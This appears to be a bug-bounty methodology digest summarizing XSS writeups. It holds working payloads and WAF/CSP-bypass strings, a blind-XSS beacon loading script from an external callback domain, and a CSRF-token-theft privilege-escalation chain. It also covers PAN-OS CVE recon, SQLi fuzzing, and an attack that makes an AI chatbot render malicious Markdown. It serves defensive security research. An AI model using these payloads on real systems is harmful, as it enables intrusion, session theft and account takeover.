# xss-csrf-redirect methodology digest

Distilled from 14 fetched writeups (batch: 20 URLs; 6 skipped — see Coverage notes). Despite the batch name, evidence is overwhelmingly XSS (reflected/stored/blind/DOM, WAF & CSP bypass, parameter pollution); no CSRF or open-redirect writeups were in this batch.

## Hunting procedures

### 1. Automated reflected-XSS pipeline (fast triage)
**When:** any new web target with GET parameters; especially for breadth-first hunting.
1. Gather historical URLs: `echo example.com | gau`
2. Filter to likely-XSS params: `| gf xss`
3. Dedupe: `| uro`
4. Reflect special chars to find unfiltered contexts: `| Gxss | kxss | tee xss_output.txt`
5. Confirm surviving candidates with DalFox (`dalfox file xss_output.txt`) or manually in the browser.
**Verify:** kxss shows which of `` < > ' " `` are reflected unencoded; confirm with a benign marker then an `alert`/`confirm` PoC.

### 2. Manual reflection probing & filter fingerprinting
**When:** any parameter reflected in HTML (view-source, not just DevTools DOM).
1. Submit a unique string, then `string'"><` and diff the reflection (use `view-source:` — Inspect Element shows the live DOM, which hides server-side encoding).
2. Fingerprint the filter with probes: `<h2>` vs `<script>` (are only "dangerous" tags blocked?); `<script src=//x` (do they require complete tags?); `</script/x>` (trailing-slash filter break); `<<h2>>` (outer-char stripping leaves `<h2>`); `<IFRAME>` (case sensitivity); `onxss=` vs `onerror=` (are only known event handlers blocked?).
3. Adapt payload to what survives (see section 3).
**Verify:** rendered reflection + dialog popup or DOM change.

### 3. Filter/WAF bypass payload construction
**When:** reflection confirmed but naive payloads are blocked or entity-encoded.
- Case + fake-handler trick: `<Img Src=OnXSS OnError=confirm(document.cookie)>` (worked against Cloudflare on a UK gov site — `OnXSS` isn't a real handler so the signature misses it, browser drops to `onerror`).
- Entity encoding: if server decodes then renders, send double-URL-encoded (`%253Cscript%253E`) or HTML-entity-encoded (`%26lt%3Bscript%26gt%3B`) input.
- No `<` needed in attribute context: `"onmouseover=alert(0)` after breaking out of a quoted attribute; use whitespace encodings (`%0d`, `%09`, `%0C`, `%00`) inside handler names: `on%0dmouseover=`.
- No-parens execution: `<script>onerror=alert;throw 1</script>`, template literals `` alert`1` ``, `location='javascript:alert\x281\x29'`, `'-prompt(1)-'` in JS-string contexts (PortSwigger cheat sheet is the canonical library here).
- Tagless contexts: `<svg onload=alert(1)` (no `>`), `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`.
**Verify:** dialog fires on the vulnerable origin (`confirm(document.domain)` preferred over `alert(1)` for reports).

### 4. HTTP Parameter Pollution (HPP) WAF bypass for JS-string-context XSS
**When:** ASP.NET (or classic ASP / Node) backend behind a signature WAF, input reflected inside a JS string (`var x = 'INPUT';`).
1. Confirm framework behavior: ASP.NET concatenates duplicate params with commas (`q=a&q=b` → `a,b`).
2. Split the JS across duplicate parameters so no single value matches a WAF signature:
   `?q=1'&q=alert(1)&q='2` → server builds `'1',alert(1),'2'` — valid JS via the comma operator.
3. Obfuscate further per-parameter: `q=1'+1;let+asd=window&q=def='al'+'ert'+;asd[def](1&q=2);'` or use `%0a` instead of `;` to start a new statement.
**Effectiveness measured:** ~70% bypass rate across 17 major WAF configs (AWS managed rules, Cloudflare, Akamai, F5, FortiWeb bypassed; only Google Cloud Armor, Azure DRS 2.1, open-appsec blocked all manual payloads — and Azure fell to `test\\\';alert(1);//`, an escape-parsing differential).
**Verify:** view the rendered concatenated string in view-source, then dialog in browser.

### 5. Blind XSS via alternate platform (mobile/API backend)
**When:** web app is WAF-hardened (even `<i>` blocked) but has a mobile app or API clients hitting the same data store. ($6,500 case)
1. Note that web input is filtered; pivot to the mobile app (register account, proxy traffic).
2. Identify fields whose content is likely reviewed by staff (comments, support tickets, profile names, order notes).
3. Submit blind-XSS beacon payloads: `"><script src=https://your-bxss-domain></script>` (use XSS Hunter / BXSS callback service).
4. Wait for callbacks; note execution origin/URL — admin panel execution = critical.
**Verify:** callback ping + screenshot of execution context; escalate impact via session/token capture only within program rules.

### 6. Stored XSS via SVG file upload
**When:** any upload/attachment feature (comments, tickets, avatars) that accepts SVG or doesn't force `Content-Disposition: attachment`.
1. Create PoC file: SVG with `<script>alert(document.domain)</script>` inside `<svg xmlns="http://www.w3.org/2000/svg">`.
2. Upload through the normal feature; confirm no validation/sanitization.
3. Open the file URL — check whether the browser renders it inline (often via a redirect from the app's download endpoint to a CDN). Inline render of `image/svg+xml` = script execution.
4. Prove cross-user impact with a second account (distinguishes stored XSS from self-XSS).
**Verify:** script fires for a second user opening the attachment.

### 7. Stored XSS → CSRF-token theft → privilege escalation chain
**When:** stored XSS fires in a higher-privilege user's session (e.g., low-priv employee content reviewed by a manager). ($2,350, High)
1. Find stored XSS in a workflow field that a privileged user must view (loan "purchase description" viewed by approving manager).
2. Host a JS payload that reads the victim's CSRF token from the DOM/meta tag and replays the app's own role-change request (e.g., PUT to the membership endpoint promoting attacker Employee → Manager).
3. Deliver via `<script src=...>` in the stored field; wait for the manager to view it.
4. Re-test with new role; look for further escalation to super-admin and data-dump endpoints.
**Verify:** demonstrate role change on your own attacker account (screenshot before/after) — don't touch real admin data.

### 8. VPN/edge-device reflected XSS with Shodan recon (CVE-2025-0133 pattern)
**When:** wildcard-scope program; PAN-OS GlobalProtect (or similar appliances) in scope.
1. Shodan dorks: `os:"PAN-OS" ssl.cert.subject.CN:"target.com"` / `hostname:"target.com" os:"PAN-OS"`.
2. Hit `/ssl-vpn/getconfig.esp` with the `user` parameter containing URL-encoded `<svg xmlns="..."><script>prompt("XSS")</script></svg>`.
3. Impact: phishing/credential theft against a trusted VPN portal (worse with Clientless VPN).
**Verify:** dialog on the appliance origin + screenshot.

### 9. Markdown-rendering XSS in chat/AI-bot surfaces
**When:** apps with chat widgets / AI assistants that render user or bot text as Markdown. (H1 #2509022, Shopify, $1,600 — page blocked to fetcher, technique from feed context)
1. Feed the chatbot crafted greetings/prompts containing Markdown image syntax pointing at attacker URLs or broken images with event handlers.
2. Test whether the renderer sanitizes the resulting HTML (`![x](url "title")`, nested HTML in alt text).
**Verify:** rendered DOM contains unsanitized handler/attribute → dialog in the chat surface.

### 10. Bonus (non-XSS): boring-default-page → hidden endpoint → SQLi
**When:** default IIS/Apache pages on subdomains — never skip them. (mugh33ra case)
1. Run IIS short-name scanner; fuzz with IIS-specific wordlist: `ffuf -u "https://t/FUZZ" -ac -fs 0 -w iis.txt` (orwagodfather list).
2. Fuzz extensions per word: `xml dll svc zip 7z htm html json js aspx asmx ashx debug` (bash loop since ffuf `-e` was unreliable for the author).
3. Read found files (`build.xml` leaked endpoints/DLL paths); even if reported as informative, mine them for endpoints.
4. Replay old Burp history requests; single-quote every parameter → error-based SQLi (`group` param), confirm with time-based payloads, exploit with Ghauri (XOR payloads) or sqlmap.
5. Cross-reference reports: link the SQLi to the "informative" info-leak report to get it reopened.

## High-value tips

- **WAF on web ≠ WAF on mobile/API.** The $6,500 blind XSS existed only because mobile endpoints shared the DB but not the WAF. Always re-test every input through every client.
- **WAFs parse parameters individually; apps concatenate.** HPP splitting defeats most signature WAFs on ASP.NET (`q`+`,` concatenation). Only ML-based WAFs (open-appsec, Azure, Cloud Armor) held up — and still fell to escape-sequence tricks like `\\\';` or swapping `alert`→`confirm`.
- **`view-source:` ≠ Inspect Element.** Use view-source for reflected/stored reflection checks; DevTools DOM for DOM XSS. Mixing them up causes false negatives.
- **Filter fingerprinting beats payload spraying.** Probes like `<h2>`, `</script/x>`, `<<h2>>`, `onxss=` tell you exactly what's blocked in ~6 requests, then craft one precise payload.
- **Fake tag + fake handler slips signatures:** `<Img Src=OnXSS OnError=...>` — the invalid handler defeats regexes; the browser still runs `onerror`.
- **Character-limit bypass via multi-account chained stored XSS:** split `<script>/*` / `*/alert(0)/*` / `*/</script>` across three accounts' fields so the combined render is valid JS.
- **XSS + CSRF token theft = account takeover without cookies.** Even with HttpOnly cookies, a stored XSS in a privileged viewer's session can replay state-changing requests using the victim's own CSRF token.
- **Default vendor pages are high-value:** hosting costs money — a default IIS page usually means forgotten infrastructure. Fuzz behind it; `build.xml`, `.asmx`, `.dll` listings are gold.
- **Re-relate "informative" reports:** when a P5 info-leak enabled your critical, say so — triagers reopen and re-rate.
- **Blind XSS = put beacons everywhere staff look:** comments, usernames, user-agent, order notes, support forms; the payoff is admin-panel execution.
- **Keep a no-parens/no-quotes payload library** (PortSwigger cheat sheet): `throw onerror=alert,1`, `` alert`1` ``, `location=name` — modern filters often allow the characters these need.
- **Use `confirm(document.domain)` or `prompt(document.domain)` in PoCs** — proves origin execution and looks better than `alert(1)` to triagers.

## Case index

| vuln class | target/program | bounty | one-line technique | URL |
|---|---|---|---|---|
| Reflected XSS (CVE-2025-0133) | PAN-OS GlobalProtect (wildcard recon) | dup/valid | Shodan PAN-OS dork → `user=` param SVG payload on `getconfig.esp` | https://zuksh.medium.com/how-i-discovered-cve-2025-0133-reflected-xss-with-shodan-recon-33297703bfc0 |
| Stored XSS (file upload) | collaborative PM platform (private) | n/a | SVG with `<script>` uploaded as task-comment attachment, rendered inline via CDN redirect | https://medium.com/@momourad248/stored-cross-site-scripting-xss-vulnerability-through-svg-file-uploads-19c0fd68b355 |
| Stored XSS | 8x8 (api endpoint) | $1,337 | (H1 blocked to fetcher; context only) stored XSS at /api/.../ID | https://hackerone.com/reports/2078490 |
| Blind XSS | hard-testing program w/ WAF | $6,500 | pivot to mobile app (no WAF) → blind XSS beacon in comments → admin panel callback | https://zhenwarx.medium.com/30-minutes-to-admin-panel-access-a-6-500-blind-xss-story-65f669135802 |
| Reflected XSS (AI chat) | Shopify | $1,600 | markdown image rendering in AI chatbot greetings (fetcher blocked; from context) | https://hackerone.com/reports/2509022 |
| Reflected XSS | PHP app (private) | n/a | `files` param reflected unencoded, `<img src=x onerror=...>` | https://ajay-vardhan01.medium.com/cross-site-scripting-via-unsanitized-input-in-a-php-endpoint-993266129f5d |
| SQLi + info disclosure | H1 private (IIS) | n/a | default IIS page → ffuf IIS wordlist → build.xml → replay Burp history → error/time-based SQLi via Ghauri | https://medium.com/p/from-default-iis-page-to-critical-sql-injection-d0e9950c66fc |
| XSS + WAF bypass (research) | 17 WAF configs benchmark | n/a | ASP.NET parameter pollution: split JS across duplicate `q` params; comma-operator rebuild | https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution |
| Reflected XSS + WAF bypass | UK MOD Police (H1) | resolved | filter fingerprint via view-source entities → `<Img Src=OnXSS OnError=confirm(...)>` Cloudflare bypass | https://0xhassan.medium.com/how-i-discovered-a-reflected-xss-on-the-mod-uk-police-website-waf-bypass-5a29627333c3 |
| Reflected XSS (CVE-2025-0133) | PAN-OS GlobalProtect | n/a | same getconfig.esp `user=` payload, PoC walkthrough | https://codewithvamp.medium.com/cve-2025-0133-reflected-xss-vulnerability-in-palo-alto-globalprotect-gateway-portal-028128f2f5b9 |
| XSS methodology | any | n/a | gau → gf xss → uro → Gxss → kxss one-liner pipeline | https://infosecwriteups.com/find-xss-vulnerabilities-in-just-2-minutes-d14b63d000b1 |
| Stored XSS → privesc | financial program (H1) | $2,350 (High) | stored XSS in loan field viewed by manager → JS steals CSRF token, PUTs role change Employee→Manager | https://ahmdhalabi.medium.com/stored-xss-to-privilege-escalation-to-admin-takeover-to-data-breach-6239d0cc3a5c |
| XSS methodology | any | n/a | filter fingerprinting probes, multi-account chained stored XSS, encoding bypasses | https://alsayyad11.medium.com/secrets-of-cross-site-scripting-xss-52a2a7364871 |
| Reflected XSS + CSP bypass | n/a (member-only, partial) | n/a | CSP bypass concept writeup (body truncated) | https://medium.com/@codingbolt.in/reflected-xss-protected-by-csp-with-csp-bypass-58d46ec1fc71 |
| Payload reference | any | n/a | PortSwigger XSS cheat sheet: no-parens/throw-onerror/template-literal/entity vectors | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |

## Coverage notes

- **Skipped/dead:**
  - `hackerone.com/reports/2078490` — H1 browser-check wall (technique inferred from feed context only).
  - `hackerone.com/reports/2509022` — H1 requires JS; technique from feed context (markdown-image XSS in AI chatbot).
  - `medium.com/@n0t0d4y/new-x` — 404 (Cloudflare-bypass payload list lost; only the tweet snippet survived).
  - `medium.com/@0xTrk/i-built-an-mcp-server-for-xss-testing-...` — HTTP 410 Gone (AI/MCP XSS-testing angle uncovered).
  - `mugh33ra.medium.com/` — author homepage, no content (superseded by the full writeup URL also in the batch).
  - `infosecwriteups.com/d14b63d000b1` — duplicate of the "XSS in 2 minutes" URL.
- **Partial fetches (member-only truncation):** infosecwriteups "2 minutes" (got the phase-1 pipeline, missed DalFox one-liners section), santhosh-adiga "payloads that still work 2025" (intro only), codingbolt CSP-bypass (concept intro only — **CSP bypass technique evidence is thin**; only the title/context confirms the topic).
- **Missing classes vs. batch name:** zero CSRF-specific and zero open-redirect writeups in this batch; the only CSRF-adjacent material is the stored-XSS→CSRF-token-theft privesc chain (case 7). The MCP/AI-security XSS angle is uncovered due to the 410.
- **Thin evidence:** DOM XSS (mentioned in methodology articles, no full case study), CSP bypass specifics, markdown/chatbot XSS details (context-only).
